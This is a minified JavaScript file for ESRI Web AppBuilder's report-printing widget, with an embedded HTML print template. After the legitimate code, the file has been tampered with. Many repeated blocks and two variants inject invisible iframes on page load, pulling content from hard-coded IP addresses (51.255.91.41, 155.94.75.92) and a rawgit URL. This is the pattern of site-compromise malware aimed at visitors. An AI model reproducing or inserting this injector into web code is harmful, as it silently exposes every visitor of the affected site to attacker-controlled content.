// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/ReportTemplate.html":'\x3c!DOCTYPE HTML\x3e\r\n\x3chtml lang\x3d"en" dir\x3d"ltr"\x3e\r\n\r\n\x3chead id\x3d"reportHead"\x3e\r\n  \x3cmeta charset\x3d"utf-8"\x3e\r\n  \x3cmeta http-equiv\x3d"X-UA-Compatible" content\x3d"IE\x3dEdge,chrome\x3d1"\x3e\r\n  \x3ctitle\x3e\x3c/title\x3e\r\n  \x3cscript\x3e\r\n    // Show/hide text area controls based on the value\r\n    function onPrintButtonClicked() {\r\n      var notesContainer, i;\r\n      notesContainer \x3d document.getElementsByClassName("esriCTNotesContainer");\r\n      //process notes to show/hide based on contents\r\n      for (i \x3d 0; i \x3c notesContainer.length; i++) {\r\n        if (notesContainer[i]) {\r\n          //Hide the notes which are not having values\r\n          if (notesContainer[i].children[1].value.trim() \x3d\x3d\x3d "") {\r\n            notesContainer[i].className +\x3d " esriCTHideReportNotes";\r\n          }\r\n          else {\r\n            //Removes hidden class if available\r\n            notesContainer[i].className \x3d\r\n              notesContainer[i].className.replace("esriCTHideReportNotes", "");\r\n          }\r\n        }\r\n      }\r\n      //after processing notes, print the window\r\n      window.print();\r\n    }\r\n  \x3c/script\x3e\r\n  \x3c!-- Report prev page css --\x3e\r\n  \x3cstyle type\x3d"text/css"\x3e\r\n    .esriCTReportMapWait {\r\n      height: 5px;\r\n      width: 100%;\r\n      position: relative;\r\n      overflow: hidden;\r\n      background-color: #ddd;\r\n    }\r\n\r\n    .esriCTReportMapWait:before {\r\n      display: block;\r\n      position: absolute;\r\n      content: "";\r\n      left: -200px;\r\n      width: 200px;\r\n      height: 5px;\r\n      background-color: #2980b9;\r\n      animation: loading 2s linear infinite;\r\n    }\r\n\r\n    @keyframes loading {\r\n      from {\r\n        left: -200px;\r\n        width: 30%;\r\n      }\r\n      50% {\r\n        width: 30%;\r\n      }\r\n      70% {\r\n        width: 70%;\r\n      }\r\n      80% {\r\n        left: 50%;\r\n      }\r\n      95% {\r\n        left: 120%;\r\n      }\r\n      to {\r\n        left: 100%;\r\n      }\r\n    }\r\n\r\n    .esriCTHTMLData {\r\n      position: relative;\r\n      width: 100%;\r\n      height: auto;\r\n    }\r\n\r\n    .jimu-rtl .esriCTHTMLData {\r\n      direction: rtl;\r\n    }\r\n\r\n    .esriCTTable {\r\n      margin-top: 10px;\r\n      padding: 0;\r\n      border-collapse: collapse;\r\n      border-spacing: 0;\r\n      width: 100%;\r\n      page-break-inside: avoid;\r\n      table-layout: fixed;\r\n    }\r\n\r\n    .jimu-rtl .esriCTTable {\r\n      direction: rtl;\r\n    }\r\n\r\n    .esriCTTable th {\r\n      border: 1px solid gray;\r\n      background-color: #E4E4E4;\r\n      word-wrap: break-word;\r\n    }\r\n\r\n    .esriCTTable td {\r\n      border: 1px solid gray;\r\n      word-wrap: break-word;\r\n    }\r\n\r\n    .esriCTNumber {\r\n      text-align: right;\r\n    }\r\n\r\n    .esriCTSectionTitle {\r\n      font-size: 18px;\r\n      color: #0f96cc;\r\n      font-weight: bold;\r\n      margin: 30px 0px;\r\n      width: calc(100% - 10px);\r\n      word-break: break-all;\r\n    }\r\n\r\n    .jimu-rtl .esriCTSectionTitle {\r\n      float: right;\r\n      direction: rtl;\r\n    }\r\n\r\n    .jimu-rtl .esriCTReportMap .esriCTSectionTitle {\r\n      float: none;\r\n    }\r\n\r\n    .esriCTReportLogo {\r\n      float: left;\r\n      max-width: calc(50% - 10px);\r\n      margin: auto 10px auto 0;\r\n      max-height: 90%;\r\n      position: absolute;\r\n      top: 0;\r\n      bottom: 0;\r\n    }\r\n\r\n    .jimu-rtl .esriCTReportLogo {\r\n      float: right;\r\n      margin: auto 0 auto 10px;\r\n    }\r\n\r\n    .esriCTPrintTitleDiv {\r\n      height: 56px;\r\n      float: right;\r\n      min-width: 50%;\r\n    }\r\n\r\n    .jimu-rtl .esriCTPrintTitleDiv {\r\n      float: left;\r\n      direction: rtl;\r\n    }\r\n\r\n    .esriCTInputTitle {\r\n      height: 55px;\r\n      line-height: 55px;\r\n      border: none;\r\n      font-size: 25px;\r\n      width: 100%;\r\n      padding: 0px;\r\n    }\r\n\r\n    .esriCTInputTitle::-ms-clear {\r\n      display: none;\r\n    }\r\n\r\n    .esriCTReportMain {\r\n      background: #FFF;\r\n      border: solid 1px #000;\r\n      margin: 0 auto;\r\n      padding: 20px;\r\n      width: 797px;\r\n    }\r\n\r\n    .esriCTReportMap {\r\n      text-align: center;\r\n    }\r\n\r\n    .esriCTReportMapImg {\r\n      max-width: 96%;\r\n      margin-top: 10px;\r\n    }\r\n\r\n    .esriCTReportLandscapeMapImg {\r\n      max-width: 80%;\r\n    }\r\n\r\n    .esriCTReportMapFail {\r\n      height: 50px;\r\n    }\r\n\r\n    .esriCTReportFooter {\r\n      text-align: center;\r\n      font-size: 80%;\r\n      padding: 10px 0;\r\n      white-space: pre-wrap;\r\n    }\r\n\r\n    .esriCTPrintPage {\r\n      padding: 30px 0;\r\n      margin: 20px auto;\r\n      font-family: arial, sans-serif;\r\n      font-size: 13px;\r\n    }\r\n\r\n    .esriCTReportBar {\r\n      width: 100%;\r\n      position: fixed;\r\n      left: 0;\r\n      top: 0;\r\n      z-index: 6;\r\n      height: 50px;\r\n      background: #e2f1fc;\r\n      border-bottom: 1px solid #000;\r\n    }\r\n\r\n    .jimu-rtl .esriCTReportBar {\r\n      left: inherit;\r\n      right: 0;\r\n    }\r\n\r\n    .esriCTPrintButton,\r\n    .esriCTCloseButton {\r\n      color: #444;\r\n      font-family: Verdana, Helvetica, sans-serif;\r\n      font-size: 12px;\r\n      -moz-border-radius: 3px;\r\n      -webkit-border-radius: 3px;\r\n      border-radius: 3px;\r\n      border: 1px solid #8b8b8b;\r\n      box-shadow: none;\r\n      -webkit-box-shadow: none;\r\n      background: #F2F2F2;\r\n      background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNlNWU1ZTUiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);\r\n      background: -moz-linear-gradient(top, #F2F2F2 0%, #D1D1D1 100%);\r\n      background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #F2F2F2), color-stop(100%, #D1D1D1));\r\n      background: -webkit-linear-gradient(top, #F2F2F2 0%, #D1D1D1 100%);\r\n      background: -o-linear-gradient(top, #F2F2F2 0%, #D1D1D1 100%);\r\n      background: -ms-linear-gradient(top, #F2F2F2 0%, #D1D1D1 100%);\r\n      background: linear-gradient(to bottom, #F2F2F2 0%, #D1D1D1 100%);\r\n      filter: progid: DXImageTransform.Microsoft.gradient(startColorstr\x3d\'#F2F2F2\', endColorstr\x3d\'#D1D1D1\', GradientType\x3d0);\r\n      margin: 10px 20px;\r\n      line-height: 16px;\r\n      display: block;\r\n      padding: 5px 10px;\r\n      outline: 0;\r\n      text-decoration: none;\r\n      cursor: pointer;\r\n      font-weight: 400;\r\n      white-space: nowrap;\r\n      float: right;\r\n    }\r\n\r\n    .jimu-rtl .esriCTPrintButton,\r\n    .jimu-rtl .esriCTCloseButton {\r\n      float: left;\r\n    }\r\n\r\n    .esriCTPrintButton:hover,\r\n    .esriCTPrintButton:focus,\r\n    .esriCTCloseButton:hover,\r\n    .esriCTCloseButton:focus {\r\n      background: #E5E6E6;\r\n      background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNlNWU1ZTUiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);\r\n      background: -moz-linear-gradient(top, #E5E6E6 0%, #A0A1A1 100%);\r\n      background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #E5E6E6), color-stop(100%, #A0A1A1));\r\n      background: -webkit-linear-gradient(top, #E5E6E6 0%, #A0A1A1 100%);\r\n      background: -o-linear-gradient(top, #E5E6E6 0%, #A0A1A1 100%);\r\n      background: -ms-linear-gradient(top, #E5E6E6 0%, #A0A1A1 100%);\r\n      background: linear-gradient(to bottom, #E5E6E6 0%, #A0A1A1 100%);\r\n      filter: progid: DXImageTransform.Microsoft.gradient(startColorstr\x3d\'#E5E6E6\', endColorstr\x3d\'#A0A1A1\', GradientType\x3d0);\r\n    }\r\n\r\n    .esriCTReportHeader {\r\n      display: block;\r\n      width: 100%;\r\n      height: 60px;\r\n      border-bottom: 1px solid #000;\r\n      margin-bottom: 5px;\r\n      position: relative;\r\n    }\r\n\r\n    .esriCTReportBarMsg {\r\n      text-align: center;\r\n      margin-top: 16px;\r\n    }\r\n\r\n    .esriCTNotesContainer {\r\n      width: 100%;\r\n      margin-top: 30px;\r\n    }\r\n\r\n    .esriCTReportNotes {\r\n      resize: none;\r\n      width: calc(100% - 5px);\r\n      max-width: calc(100% - 5px);\r\n      font-family: "Arial";\r\n      font-size: 13px;\r\n      border: 1px solid gray;\r\n      overflow-y: hidden;\r\n      /* prevents scroll bar flash */\r\n    }\r\n\r\n    .esriCTReportNotesParagraph {\r\n      display: none;\r\n      white-space: pre-wrap;\r\n    }\r\n\r\n    .jimu-rtl .esriCTReportNotes {\r\n      direction: rtl;\r\n    }\r\n\r\n    .esriCTHidden {\r\n      display: none;\r\n    }\r\n  \x3c/style\x3e\r\n  \x3c!-- Media print css --\x3e\r\n  \x3cstyle type\x3d"text/css" media\x3d"print"\x3e\r\n    .esriCTPrintPage {\r\n      padding: 0;\r\n      color: #000;\r\n      margin: 0;\r\n      float: none;\r\n      background: #fff url(none);\r\n    }\r\n\r\n    .esriCTTable {\r\n      page-break-inside: avoid;\r\n    }\r\n\r\n    .esriCTPageBreak {\r\n      page-break-after: always;\r\n    }\r\n\r\n    .esriCTReportFooter {\r\n      font-size: 75%;\r\n    }\r\n\r\n    .esriCTReportBar {\r\n      display: none;\r\n    }\r\n\r\n    .esriCTReportMain {\r\n      border: none;\r\n    }\r\n\r\n    .esriCTReportMapImg {\r\n      box-shadow: none;\r\n      border: none;\r\n    }\r\n\r\n    .esriCTReportNotes {\r\n      display: none;\r\n    }\r\n\r\n    .esriCTReportNotesParagraph {\r\n      display: block;\r\n    }\r\n\r\n    .esriCTHideReportNotes {\r\n      display: none;\r\n    }\r\n  \x3c/style\x3e\r\n  \x3cscript\x3e\r\n    function showError(evt) {\r\n      alert(document.getElementById(\'showErrorButton\').innerHTML);\r\n    }\r\n  \x3c/script\x3e\r\n\x3c/head\x3e\r\n\r\n\x3cbody id\x3d"reportBody" class\x3d"esriCTPrintPage"\x3e\r\n  \x3cbutton id\x3d"showErrorButton" style\x3d"display: none" onclick\x3d"showError()"\x3e\x3c/button\x3e\r\n  \x3cdiv class\x3d"esriCTReportBar"\x3e\r\n    \x3cdiv id\x3d"closeButton" class\x3d"esriCTCloseButton" title\x3d"Close" onclick\x3d"window.close();"\x3eClose\x3c/div\x3e\r\n    \x3cdiv id\x3d"printButton" class\x3d"esriCTPrintButton" title\x3d"Print" onclick\x3d"onPrintButtonClicked();"\x3ePrint\x3c/div\x3e\r\n    \x3cdiv id\x3d"reportBarMsg" class\x3d"esriCTReportBarMsg"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv id\x3d"reportMain" class\x3d"esriCTReportMain"\x3e\r\n    \x3cdiv id\x3d"reportHeader" class\x3d"esriCTReportHeader"\x3e\r\n      \x3cimg id\x3d"reportLogo" class\x3d"esriCTReportLogo esriCTHidden" src\x3d""\x3e\r\n      \x3cdiv id\x3d"printTitleDiv" class\x3d"esriCTPrintTitleDiv"\x3e\r\n        \x3cinput id\x3d"reportTitle" type\x3d"text" class\x3d"esriCTInputTitle"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv id\x3d"reportData"\x3e\x3c/div\x3e\r\n    \x3cdiv id\x3d"footNotes" class\x3d"esriCTReportFooter"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/body\x3e\r\n\r\n\x3c/html\x3e'}});
define("dojo/_base/declare jimu/BaseWidget jimu/utils dojo/Evented ./PageUtils dojo/text!./templates/ReportTemplate.html dojo/_base/lang dojo/_base/array dojo/_base/window dojo/dom-construct dojo/dom-class dojo/dom-style dojo/dom dojo/string dojo/on esri/tasks/PrintParameters esri/tasks/PrintTemplate esri/tasks/PrintTask".split(" "),function(r,t,l,u,h,v,f,m,w,g,k,n,e,x,q,y,z,A){return r([t,u],{baseClass:"jimu-report",_printService:null,_printWindow:null,_sizeInPixels:{},_windowOpenedTimer:null,_shownUnableToPrintMapMsg:!1,
printTaskUrl:null,reportLogo:"",reportLayout:{},maxNoOfCols:3,alignNumbersToRight:!1,styleSheets:[],styleText:"",constructor:function(){this.inherited(arguments);this._sizeInPixels={};this.printTaskUrl=null;this.reportLayout={};this.styleSheets=[]},postMixInProperties:function(){this.nls=f.mixin(window.jimuNls.common,window.jimuNls.report)},postCreate:function(){var a;a={pageSize:h.PageSizes.A4,orientation:h.Orientation.Portrait};this.inherited(arguments);this.setReportLayout(this.reportLayout,a);
this.reportLayout.dpi=96;this.printTaskUrl&&this._createPrintTask()},setReportLayout:function(a,b){b||(b=this.reportLayout);this._validateParameters(a)?this.reportLayout=f.mixin(b,a):this.reportLayout=b},setMapLayout:function(a){var b;b=this.reportLayout.pageSize.MapLayout?this.reportLayout.pageSize.MapLayout:"MAP_ONLY";"MAP_ONLY"===b?(a.exportOptions={dpi:this.reportLayout.dpi},this.reportLayout.orientation.Type===h.Orientation.Landscape.Type&&this.reportLayout.pageSize!==h.PageSizes.Custom?(a.exportOptions.width=
this._sizeInPixels.Height,a.exportOptions.height=this._sizeInPixels.Width):(a.exportOptions.width=this._sizeInPixels.Width,a.exportOptions.height=this._sizeInPixels.Height)):b+=" "+this.reportLayout.orientation.Type;a.layout=b;return a},_validateParameters:function(){return this.reportLayout.pageSize!==h.PageSizes.Custom||this.reportLayout.size?!0:!1},_createPrintTask:function(){this._printService=new A(this.printTaskUrl,{async:!1})},_createPrintMapParameters:function(a){var b,c;c=new z;a.printTemplate?
(c=a.printTemplate,c.format?(b=c.format.toLowerCase(),"png32"!==b&&"png8"!==b&&"jpg"!==b&&"gif"!==b&&(c.format="jpg")):c.format="jpg"):(c=this.setMapLayout(c),c.layoutOptions={customTextElements:[{Date:""}]},c.preserveScale=!1,c.showAttribution=!0,c.format="jpg");b=new y;b.map=a.map;b.outSpatialReference=a.map.spatialReference;b.template=c;return b},print:function(a,b){var c,d;this._printService?(this._shownUnableToPrintMapMsg=!1,c=screen.width/2,d=screen.height/1.5,c=11===l.has("ie")?"toolbar\x3dno, location\x3dno, directories\x3dno, status\x3dyes, menubar\x3dno,scrollbars\x3dyes, resizable\x3dyes, width\x3d"+
c+", height\x3d"+d+", top\x3d"+(screen.height/2-d/2)+", left\x3d"+(screen.width/2-c/2):null,d=l.detectUserAgent(),(d.browser.hasOwnProperty("firefox")&&d.browser.firefox||d.os.hasOwnProperty("ipad")&&d.os.ipad||d.os.hasOwnProperty("iphone")&&d.os.iphone)&&this._printWindow&&this._printWindow.close(),this._printWindow=window.open("","report",c,!0),this._windowOpenedTimer&&clearInterval(this._windowOpenedTimer),this._windowOpenedTimer=setInterval(f.hitch(this,function(){this._printWindow.closed&&(clearInterval(this._windowOpenedTimer),
this.emit("report-window-closed"))}),500),this._printWindow.focus(),setTimeout(f.hitch(this,function(){w.withDoc(this._printWindow.document,f.hitch(this,function(){this._printWindow.document.open("text/html","replace");this._printWindow.document.write(v);window.isRTL&&k.add(e.byId("reportBody"),"jimu-rtl");(this.styleSheets&&0<this.styleSheets.length||this.styleText&&""!==this.styleText)&&this._addExternalStyleSheets();this._setPageSize();this._setButtonLabels();this._setReportSizeMessage();this._setReportLogo();
this._setReportTitle(a);this._setReportData(b);this._setFootNotes();this._printWindow.document.close()}))}),500)):this.emit("reportError")},_addExternalStyleSheets:function(){var a=e.byId("reportHead");a&&(m.forEach(this.styleSheets,f.hitch(this,function(b){g.create("link",{rel:"stylesheet",type:"text/css",href:b},a)})),this.styleText&&g.create("style",{type:"text/css",innerHTML:this.styleText},a))},_setPageSize:function(){var a,b,c;c=e.byId("reportMain");this.reportLayout&&(a=this.reportLayout.pageSize,
this.reportLayout.pageSize===h.PageSizes.Custom&&this.reportLayout.size&&(a=this.reportLayout.size),a=h.getPageSizeInPixels(a,this.reportLayout.dpi));b=this.reportLayout.orientation.Type===h.Orientation.Landscape.Type&&this.reportLayout.pageSize!==h.PageSizes.Custom?a.Height:a.Width;this._sizeInPixels=a;n.set(c,{width:b+"px"})},_setReportData:function(a){var b=e.byId("reportData"),c=e.byId("showErrorButton");c.innerHTML=this.nls.unableToPrintMapMsg;b&&m.forEach(a,f.hitch(this,function(a){var d=g.create("div",
{},b);a.addPageBreak&&k.add(d,"esriCTPageBreak");"table"===a.type?this._formatAndRenderTables(d,a):"html"===a.type?this._renderHTMLData(d,a):"map"===a.type?(a.title&&this._addSectionTitle(a.title,d),k.add(d,"esriCTReportMap esriCTReportMapWait"),a.extent&&a.data.map.setExtent(a.extent),this._executePrintTask(a,d,c)):"note"===a.type&&this._createReportNote(d,a)}))},_setFootNotes:function(){var a,b;(b=e.byId("footNotes"))&&this.footNotes&&(a=l.sanitizeHTML(this.footNotes?this.footNotes:""),b.innerHTML=
l.fieldFormatter.getFormattedUrl(a))},_setReportLogo:function(){var a,b,c,d;(a=e.byId("reportLogo"))&&this.reportLogo&&(k.remove(a,"esriCTHidden"),a.src=this.reportLogo,d=e.byId("reportHeader"),b=e.byId("reportMain"),c=e.byId("printTitleDiv"),window.isRTL&&g.place(c,d,"first"),b&&c&&(a.complete&&n.set(c,{width:b.clientWidth-a.clientWidth-51+"px"}),this.own(q(a,"load",f.hitch(this,function(){setTimeout(f.hitch(this,function(){n.set(c,{width:b.clientWidth-a.clientWidth-51+"px"})}),300)})))))},_setReportTitle:function(a){var b=
e.byId("reportTitle");b&&a&&(b.value=a)},_createReportNote:function(a,b){var c,d="",f;b.title&&(d=b.title);d=this._addSectionTitle(d,a);k.add(d,"esriCTNotesTitle");c=g.create("textarea",{"class":"esriCTReportNotes",placeholder:this.nls.notesHint,rows:5},a);f=g.create("p",{"class":"esriCTReportNotesParagraph"},a);k.add(a,"esriCTNotesContainer");b.defaultText&&(c.value=b.defaultText);this.own(q(c,"keydown, change",function(){c.style.height="auto";f.innerHTML=l.sanitizeHTML(c.value?c.value:"");c.style.height=
c.scrollHeight+"px"}))},_setReportSizeMessage:function(){var a,b;this.reportLayout.pageSize===h.PageSizes.Custom&&this.reportLayout.size?(a=this.reportLayout.size,b=this.reportLayout.pageSize):(a=this.reportLayout.pageSize,b=this.reportLayout.pageSize.SizeName);a=this.reportLayout.orientation.Type===h.Orientation.Landscape.Type&&this.reportLayout.pageSize!==h.PageSizes.Custom?" ("+a.Height+"'' X "+a.Width+"'') ":" ("+a.Width+"'' X "+a.Height+"'') ";e.byId("reportBarMsg").innerHTML=x.substitute(this.nls.reportDimensionsMsg,
{paperSize:b+a+this.reportLayout.orientation.Text})},_setButtonLabels:function(){var a=e.byId("printButton");a.innerHTML=this.nls.printButtonLabel;a.title=this.nls.printButtonLabel;a=e.byId("closeButton");a.innerHTML=this.nls.close;a.title=this.nls.close},_executePrintTask:function(a,b,c){a=this._createPrintMapParameters(a);this._printService.execute(a,f.hitch(this,function(a){b&&(k.remove(b,"esriCTReportMapWait"),a=g.create("img",{src:a.url,"class":"esriCTReportMapImg"},b),this.reportLayout.orientation.Type===
h.Orientation.Landscape.Type&&k.add(a,"esriCTReportLandscapeMapImg"));this.emit("report-export-task-completed")}),f.hitch(this,function(){k.replace(b,"esriCTReportMapFail","esriCTPageBreak esriCTReportMapWait");this._shownUnableToPrintMapMsg||(this._shownUnableToPrintMapMsg=!0,c.click());this.emit("report-export-task-failed")}))},_renderHTMLData:function(a,b){a=g.create("div",{"class":"esriCTHTMLData"},a);b.title&&this._addSectionTitle(b.title,a);g.create("div",{innerHTML:b.data},a)},_addSectionTitle:function(a,
b){a=l.sanitizeHTML(a?a:"");return g.create("div",{innerHTML:a,"class":a?"esriCTSectionTitle":""},b)},_formatAndRenderTables:function(a,b){var c=b.data,d,f,e,h,k=this.maxNoOfCols;c.maxNoOfCols&&(k=c.maxNoOfCols);c.cols.length>k&&2>=c.cols.length-k&&(k=c.cols.length);d=0;for(f=c.cols.length;d<f;d+=k){var l={cols:[],rows:[]},p=d+k,m=!1;l.title=0===d?b.title:"";e=c.cols.length-p;2>=e&&0<e&&(p+=e,m=!0);e=c.cols.slice(d,p);h=[];for(var n=0;n<c.rows.length;n++)h.push(c.rows[n].slice(d,p));l.cols=e;l.rows=
h;this._renderTable(g.create("div",{},a),l,b.data.showRowIndex);if(m)break}},_renderTable:function(a,b,c){var d,e;this._addSectionTitle(b.title,a);a=g.create("table",{cellpadding:5,style:{width:"100%"},"class":"esriCTTable"},a);d=g.create("tbody",{},a);e=g.create("tr",{},d);c&&g.create("th",{innerHTML:"#",style:{width:"20px"}},e);m.forEach(b.cols,f.hitch(this,function(a){g.create("th",{innerHTML:a},e)}));m.forEach(b.rows,f.hitch(this,function(a,b){var e;e=g.create("tr",{},d);c&&g.create("td",{innerHTML:b+
1,style:{"word-wrap":"normal"}},e);m.forEach(a,f.hitch(this,function(a){var b=l.fieldFormatter.getFormattedUrl(a),b=g.create("td",{innerHTML:b},e);this.alignNumbersToRight&&!isNaN(parseFloat(a))&&k.add(b,"esriCTNumber")}))}))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});